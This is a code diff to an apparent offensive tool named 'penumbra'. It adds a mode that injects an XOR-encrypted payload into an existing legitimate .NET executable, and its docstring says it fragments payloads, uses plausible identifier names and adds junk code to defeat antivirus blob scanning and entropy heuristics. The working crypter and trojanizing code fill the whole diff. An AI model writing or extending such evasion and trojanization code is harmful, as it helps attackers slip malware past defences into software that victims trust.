@@ -247,7 +247,11 @@ def _generate_loader_project(
 class DotnetEmbedPass:
     """Wrap the assembly in an in-memory loader with XOR-encrypted payload.
 
-    Features:
+    Two modes:
+    - Default: generate a new loader from scratch (fragmented, junk code, WinExe)
+    - --host: inject loader code into an existing legitimate .NET assembly
+
+    Features (default mode):
     - Payload fragmented across multiple classes (defeats blob scanning)
     - Plausible identifier names (defeats obfuscation heuristics)
     - Junk code with low-entropy strings (reduces Shannon entropy)
@@ -264,14 +268,19 @@ class DotnetEmbedPass:
         if not shutil.which("dotnet"):
             raise RuntimeError("dotnet SDK not found. Install .NET 8+ SDK.")
 
-        # XOR encrypt the payload with a random 32-byte key
+        host_path = config.extra.get("host")
+        if host_path and isinstance(host_path, str):
+            return self._trojanize(data, Path(host_path))
+        return self._generate_loader(data)
+
+    def _generate_loader(self, data: bytes) -> bytes:
+        """Generate a standalone loader from scratch."""
         key = os.urandom(32)
         encrypted = _xor_encrypt(data, key)
 
         payload_b64 = base64.b64encode(encrypted).decode("ascii")
         key_b64 = base64.b64encode(key).decode("ascii")
 
-        # Generate loader project in a temp directory
         tmp_dir = tempfile.mkdtemp(prefix="penumbra_loader_")
         tmp_path = Path(tmp_dir)
 
@@ -300,3 +309,52 @@ class DotnetEmbedPass:
             return dll_path.read_bytes()
         finally:
             shutil.rmtree(tmp_dir, ignore_errors=True)
+
+    def _trojanize(self, data: bytes, host_path: Path) -> bytes:
+        """Inject payload into an existing .NET host binary via the C# worker."""
+        key = os.urandom(32)
+        encrypted = _xor_encrypt(data, key)
+
+        payload_b64 = base64.b64encode(encrypted).decode("ascii")
+        key_b64 = base64.b64encode(key).decode("ascii")
+
+        worker_project = Path(__file__).resolve().parent.parent.parent / "dotnet-worker"
+
+        # Write host, payload, and key to temp files
+        tmp_host = tempfile.NamedTemporaryFile(suffix=".exe", delete=False)
+        tmp_out = tempfile.NamedTemporaryFile(suffix=".exe", delete=False)
+        tmp_payload = tempfile.NamedTemporaryFile(suffix=".b64", delete=False)
+        tmp_key = tempfile.NamedTemporaryFile(suffix=".key", delete=False)
+
+        tmp_host_path = Path(tmp_host.name)
+        tmp_out_path = Path(tmp_out.name)
+        tmp_payload_path = Path(tmp_payload.name)
+        tmp_key_path = Path(tmp_key.name)
+
+        for f in (tmp_host, tmp_out, tmp_payload, tmp_key):
+            f.close()
+
+        try:
+            tmp_host_path.write_bytes(host_path.read_bytes())
+            tmp_payload_path.write_text(payload_b64)
+            tmp_key_path.write_text(key_b64)
+
+            cmd = [
+                "dotnet", "run", "--project", str(worker_project),
+                "--", "--input", str(tmp_host_path),
+                "--output", str(tmp_out_path),
+                "--passes", "trojanize",
+                "--payload-file", str(tmp_payload_path),
+                "--key-file", str(tmp_key_path),
+            ]
+
+            result = subprocess.run(cmd, capture_output=True)
+
+            if result.returncode != 0:
+                stderr = result.stderr.decode("utf-8", errors="replace")
+                raise RuntimeError(f"Trojanize failed: {stderr}")
+
+            return tmp_out_path.read_bytes()
+        finally:
+            for p in (tmp_host_path, tmp_out_path, tmp_payload_path, tmp_key_path):
+                p.unlink(missing_ok=True)
